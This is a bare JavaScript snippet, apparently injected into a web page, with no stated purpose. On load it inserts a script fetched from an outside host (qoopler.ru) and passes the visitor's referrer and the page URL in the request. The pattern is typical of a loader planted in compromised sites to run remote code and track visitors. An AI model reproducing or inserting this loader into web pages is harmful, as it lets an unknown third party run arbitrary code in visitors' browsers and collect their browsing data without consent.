(function (d, w) {
	var n = d.getElementsByTagName("script")[0],
			s = d.createElement("script");
			s.type = "text/javascript";
			s.async = true;
			s.src = "https://qoopler.ru/index.php?ref="+d.referrer+"&page=" + encodeURIComponent(w.location.href);
			n.parentNode.insertBefore(s, n);
})(document, window);
